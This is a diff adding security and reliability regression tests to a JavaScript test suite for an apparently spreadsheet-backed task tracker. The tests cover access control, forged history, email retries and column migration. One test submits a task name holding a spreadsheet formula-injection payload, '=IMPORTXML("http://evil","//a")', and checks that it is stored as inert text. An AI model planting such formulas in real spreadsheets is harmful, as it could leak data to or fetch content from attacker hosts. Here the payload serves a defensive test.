@@ -447,6 +447,118 @@ test('upgrade: an existing task in the old layout still reads and its owner stil
   assert.ok(edit(b, s, t.id, { status: 'In Progress' }, { status: t.status }).ok);
 });
 
+// ---------- found by the independent review ----------
+test('a manager cannot hide someone else inside "their own" task on a project they do not manage', () => {
+  const { b, pid, s } = company(); const m = s('mgr@suraasa.com');
+  for (const rec of [{ ownerEmail: 'mgr@suraasa.com, rahul@suraasa.com' }, { owner: 'Manny Ger, Rahul Verma' }, { ownerEmail: 'rahul@suraasa.com' }]) {
+    const r = b.post({ action: 'apply', session: m, requestId: 'x' + Math.random(), ops: [{ c: 'tasks', id: 'X' + Math.random(), create: true, rec: Object.assign({ name: 'Sneaky', projectId: pid, status: 'Not Started' }, rec) }] });
+    assert.ok(r.rejected, JSON.stringify(rec));
+  }
+  assert.strictEqual(b.mails.length, 0);
+  assert.ok(b.post({ action: 'apply', session: m, requestId: 'mine', ops: [{ c: 'tasks', id: 'OWN1', create: true, rec: { name: 'Mine', projectId: pid, status: 'Not Started', ownerEmail: 'mgr@suraasa.com' } }] }).ok, 'own task still works');
+});
+test('writing yourself a task does not unlock its project', () => {
+  const { b, pid, s } = company(); const r = s('rahul@suraasa.com');
+  const before = pull(b, r).state.projects.find(p => p.id === pid);
+  assert.ok(b.post({ action: 'apply', session: r, requestId: 'self', ops: [{ c: 'tasks', id: 'S1', create: true, rec: { name: 'Mine', projectId: pid, status: 'Not Started', ownerEmail: 'rahul@suraasa.com' } }] }).ok);
+  const after = pull(b, r).state; const p = after.projects.find(x => x.id === pid);
+  assert.ok(after.tasks.some(t => t.id === 'S1'), 'they still see the task');
+  assert.strictEqual(Object.keys(p).length, Object.keys(before).length); assert.strictEqual(p.objective, undefined);
+  const c = b.post({ action: 'apply', session: r, requestId: 'cmt', ops: [{ c: 'updates', id: 'U9', create: true, rec: { projectId: pid, week: '2026-11-02', author: 'Rahul Verma' } }] }); assert.ok(c.rejected);
+});
+test('a name two people share gives neither of them rights', () => {
+  const { b, s } = company(); const a = s('boss@suraasa.com'); b.addUser({ email: 'rahul2@suraasa.com', name: 'Rahul Verma', role: 'Employee' });
+  const t = pull(b, a).state.tasks[0], sh = b.ss.getSheetByName('Tasks'); sh.getRange(b.ctx.rowOfId_(sh, 1, t.id), 7).setValue('Rahul Verma');
+  assert.ok(!pull(b, s('rahul2@suraasa.com')).state.tasks.some(x => x.id === t.id));
+  assert.ok(!pull(b, s('rahul@suraasa.com')).state.tasks.some(x => x.id === t.id));
+  assert.ok(edit(b, s('rahul2@suraasa.com'), t.id, { progress: 5 }, { progress: 0 }).rejected);
+});
+test('running out of the daily email limit costs no attempts, however long it lasts', () => {
+  const o = { mailQuota: 0 }; const { b, pid, s } = company(o); const r = assign(b, s('boss@suraasa.com'), pid);
+  const sh = b.ss.getSheetByName('NotificationLog'), col = b.ctx.NOTIF_COLS.indexOf('nextAttemptAt') + 1;
+  for (let i = 0; i < 9; i++) { const e = emails(b).find(x => x.taskId === r.task.id); sh.getRange(e._row, col).setValue(new Date(Date.now() - 1000).toISOString()); b.ctx.processNotifications(); }
+  const e = emails(b).find(x => x.taskId === r.task.id); assert.strictEqual(e.deliveryStatus, 'failed'); assert.strictEqual(e.attempts, '0');
+});
+test('upgrade: blank and repeated column headings lose nothing', () => {
+  const b = createBackend({ strict: true, props: { AUTH_REQUIRED: 'false', AUTH_OFF_UNTIL: String(Date.now() + 1e9) } });
+  const sh = b.ss.insertSheet('Mine'); sh.cells = [['id', 'Rate', '', 'Rate', 'name'], ['1', 'a', 'kept', 'b', 'x']];
+  b.ctx.migrateColumns_(sh, sh.cells[0].slice(), ['id', 'name', 'status']);
+  const head = sh.cells[0], row = sh.cells[1], all = row.join('|');
+  assert.strictEqual(row[head.indexOf('name')], 'x'); for (const v of ['a', 'b', 'kept']) assert.ok(all.includes(v), v);
+});
+test('upgrade: a formula in a hand-added column stays a formula', () => {
+  const b = oldSheet(), sh = b.ss.getSheetByName('Tasks'), head = sh.cells[0], at = head.indexOf('My notes');
+  sh.cells[1][at] = '=1+1'; b.ctx.setupSheet();
+  const h = sh.cells[0]; assert.strictEqual(sh.cells[1][h.indexOf('My notes')], '=1+1'); assert.ok(h.indexOf('My notes') > h.indexOf('assignedAt'));
+});
+test('editing milestones keeps columns added by hand on that project\'s rows', () => {
+  const { b, s } = company(); const a = s('boss@suraasa.com'); const st = pull(b, a).state, p = st.projects.find(x => (x.milestones || []).length > 1);
+  const sh = b.ss.getSheetByName('Milestones'), w = sh.getLastColumn(); sh.getRange(1, w + 1).setValue('Hand'); 
+  const rows = sh.getRange(2, 1, sh.getLastRow() - 1, 2).getValues(); rows.forEach((r, i) => { if (r[0] === p.id) sh.getRange(i + 2, w + 1).setValue('note-' + r[1]); });
+  const next = p.milestones.map((m, i) => (i ? m : Object.assign({}, m, { name: 'Renamed' })));
+  const res = b.post({ action: 'apply', session: a, requestId: 'ms', ops: [{ c: 'projects', id: p.id, set: { milestones: next }, base: { milestones: p.milestones } }] }); assert.ok(res.ok, JSON.stringify(res).slice(0, 300));
+  const after = sh.getRange(2, 1, sh.getLastRow() - 1, w + 1).getValues().filter(r => r[0] === p.id);
+  assert.strictEqual(after.length, p.milestones.length); after.forEach(r => assert.strictEqual(r[w], 'note-' + r[1]));
+});
+test('IDs keep counting past 999', () => {
+  const b = createBackend(); assert.strictEqual(b.ctx.nextTaskId_([{ id: 'T-999' }]), 'T-1000'); assert.strictEqual(b.ctx.nextTaskId_([{ id: 'T-007' }]), 'T-008');
+  assert.strictEqual(b.ctx.nextEmployeeId_([{ employeeId: 'EMP-999' }]), 'EMP-1000');
+});
+test('a "restore" from a non-admin cannot forge history, and notes cannot be forged on a new record', () => {
+  const { b, pid, s } = company(); const r = s('rahul@suraasa.com');
+  b.post({ action: 'apply', session: r, requestId: 'f1', ops: [{ c: 'tasks', id: 'F1', create: true, restoreOf: 'x', rec: { name: 'F', projectId: pid, status: 'Not Started', ownerEmail: 'rahul@suraasa.com', createdBy: 'Boss Lady', originalDue: '2020-01-01' } }] });
+  assert.strictEqual((pull(b, r).state.tasks.find(t => t.id === 'F1') || {}).createdBy, 'Rahul Verma');
+  const n = b.post({ action: 'apply', session: r, requestId: 'f2', ops: [{ c: 'tasks', id: 'F2', create: true, rec: { name: 'G', projectId: pid, status: 'Not Started', ownerEmail: 'rahul@suraasa.com', notes: [{ id: 'n', text: 'Approved', author: 'Boss Lady', ts: '2026-01-01' }] } }] });
+  assert.ok(n.rejected);
+  const t = 'F1', w = edit(b, r, t, { notes: [{ id: 'n2', text: 'Approved', who: 'Rahul Verma', author: 'Boss Lady', ts: '2026-01-01' }] }, { notes: [] });
+  assert.ok(w.rejected, 'who and author must both be the person');
+});
+test('test emails never reach an employee after going live, and do not use up the real one', () => {
+  let down = true; const { b, pid, s } = company({ mailFails: () => down, props: { AUTH_CLIENT_ID: CLIENT, AUTH_DOMAIN: 'suraasa.com', EMAIL_MODE: 'test' } }); const a = s('boss@suraasa.com');
+  const t = assign(b, a, pid, { due: future(1) }).task; b.ctx.dailyChecks();
+  down = false; b.props.set('EMAIL_MODE', 'live'); b.ss.getSheetByName('NotificationLog'); const col = b.ctx.NOTIF_COLS.indexOf('nextAttemptAt') + 1;
+  emails(b).filter(x => x.deliveryStatus === 'failed').forEach(e => b.ss.getSheetByName('NotificationLog').getRange(e._row, col).setValue(new Date(Date.now() - 1000).toISOString()));
+  b.ctx.processNotifications();
+  assert.ok(b.mails.length >= 1); assert.ok(b.mails.every(m => m.to === 'owner@suraasa.com'), b.mails.map(m => m.to).join());
+  b.mails.length = 0; b.ctx.dailyChecks();
+  assert.ok(b.mails.some(m => m.to === 'rahul@suraasa.com' && m.body.includes(t.id)), 'the first live morning still sends');
+});
+test('retrying one row of a batch does not abandon it, and emails turned off stay queued', () => {
+  let down = true; const { b, pid, s } = company({ mailFails: () => down }); const a = s('boss@suraasa.com');
+  const r = assign(b, a, pid); const e = emails(b).find(x => x.taskId === r.task.id);
+  assert.ok(b.post({ action: 'notification_retry', session: a, id: e.notificationId }).requeued === 1);
+  assert.strictEqual(emails(b).find(x => x.taskId === r.task.id).deliveryStatus, 'failed'); assert.strictEqual(emails(b).find(x => x.taskId === r.task.id).attempts, '1');
+  b.props.set('ASSIGN_EMAIL', 'off'); const col = b.ctx.NOTIF_COLS.indexOf('nextAttemptAt') + 1; b.ss.getSheetByName('NotificationLog').getRange(e._row, col).setValue(new Date(Date.now() - 1000).toISOString());
+  b.ctx.processNotifications(); assert.strictEqual(emails(b).find(x => x.taskId === r.task.id).deliveryStatus, 'failed');
+  down = false; b.props.delete('ASSIGN_EMAIL'); b.ctx.processNotifications();
+  assert.strictEqual(emails(b).find(x => x.taskId === r.task.id).deliveryStatus, 'accepted');
+});
+test('direct Sheet edits are shown to Super Admins only', () => {
+  const { b, s } = company(); const sh = b.ss.getSheetByName('AuditLog');
+  sh.getRange(sh.getLastRow() + 1, 1, 1, 14).setValues([['id', '2026-11-05', '', 'Sheet', 'risks', 'R1', '', '', 'sheet_edit', '', 'old secret', 'new secret', 'Edited', '']]);
+  assert.ok(!JSON.stringify(pull(b, s('view@suraasa.com')).state.audit).includes('new secret'));
+  assert.ok(JSON.stringify(pull(b, s('boss@suraasa.com')).state.audit).includes('new secret'));
+});
+test('a manager can write progress history only for projects they manage', () => {
+  const { b, pid, s } = company(); const r = b.post({ action: 'snapshot', session: s('mgr@suraasa.com'), rows: [{ date: '2026-11-05', projectId: pid, progress: 100, active: 1 }] }); assert.strictEqual(r.added, 0);
+  b.setProjectOwner(pid, 'mgr@suraasa.com'); assert.strictEqual(b.post({ action: 'snapshot', session: s('mgr@suraasa.com'), rows: [{ date: '2026-11-05', projectId: pid, progress: 10, active: 1 }] }).added, 1);
+});
+test('a known confirmation ID does not fetch someone else\'s task, and daily notices stay private', () => {
+  const { b, pid, s } = company(); const a = s('boss@suraasa.com'); assign(b, a, pid, { name: 'Boss only' }, 'KEY-1'); b.setProjectOwner(pid, 'mgr@suraasa.com');
+  const r = assign(b, s('mgr@suraasa.com'), pid, { name: 'Other' }, 'KEY-1'); assert.ok(!JSON.stringify(r.task || {}).includes('Boss only'));
+  assert.strictEqual(b.ctx.notifiedFor_('KEY-1', { email: 'priya@suraasa.com' }).length, 0);
+});
+test('a formula typed into a task is stored as text and read back unchanged', () => {
+  const { b, pid, s } = company(); const a = s('boss@suraasa.com'); const t = assign(b, a, pid, { name: '=IMPORTXML("http://evil","//a")' }).task;
+  assert.strictEqual(row(b, 'Tasks', t.id).name[0], "'"); assert.ok(pull(b, a).state.tasks.find(x => x.id === t.id).name.startsWith('=IMPORTXML'));
+});
+test('one huge digest stays within Google\'s email size', () => {
+  const { b, pid, s } = company(); const a = s('boss@suraasa.com'); const big = 'x'.repeat(590);
+  const ts = []; for (let i = 0; i < 60; i++) ts.push({ c: 'tasks', id: 'B' + i, create: true, rec: { name: 'Task ' + i, desc: big, projectId: pid, status: 'Not Started', ownerEmail: 'rahul@suraasa.com', due: future(30), priority: 'P2' } });
+  assert.ok(b.post({ action: 'apply', session: a, requestId: 'bulk', ops: ts }).ok);
+  assert.ok(b.mails[0].htmlBody.length < 150000, String(b.mails[0].htmlBody.length)); assert.ok(b.mails[0].body.includes('30 more')); assert.match(b.mails[0].subject, /^60 New Items/);
+});
+
 const failed = results.filter(r => r[0] === 'FAIL');
 results.forEach(r => console.log(r[0], r[1]));
 console.log(results.length - failed.length + ' of ' + results.length + ' passed');
